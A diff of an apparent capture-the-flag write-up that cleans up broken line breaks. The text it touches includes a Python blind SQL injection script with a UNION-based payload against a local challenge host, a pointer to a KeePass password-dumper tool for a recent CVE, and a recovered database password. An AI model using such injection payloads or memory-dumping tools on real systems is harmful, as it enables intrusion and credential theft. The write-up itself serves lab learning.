@@ -122,13 +122,7 @@ def string(start,end):\
 def passwd():\
 <br>
 </br>
-        url='http:
-    \
-    <br>
-    </br>//127.0.0.1:
-    \
-    <br>
-    </br>10003/?username='
+        url='http://127.0.0.1:10003/?username='
         test=string(48,127)
         username="admin' union distinct select 1,2,0x{hex} order by 3 desc%23&password=1"
         flag=""
@@ -177,14 +171,8 @@ Enumerating the machine, we find that this user has some hidden files under his 
 ![img](images/image_2023-06-25_232511782.png)\
 <br>
 </br>
-I will not be going through this in detail, but this is the latest KeePass CVE released 3 weeks ago, yes we only bring you fresh meet ;) you can check out this repo and follow the steps to solve it:\
-<br>
-</br> ``https:\
-<br>
-</br>//github.com/vdohney/keepass-password-dumper``
-We get the password for the keepass database is:\
-<br>
-</br> ``mallafouedyesahby``
+I will not be going through this in detail, but this is the latest KeePass CVE released 3 weeks ago, yes we only bring you fresh meet ;) you can check out this repo and follow the steps to solve it:``https://github.com/vdohney/keepass-password-dumper``
+We get the password for the keepass database is:``mallafouedyesahby``
 We open it and we get the creds for iwd user (shoutout to my good friend iwd):\
 <br>
 </br>
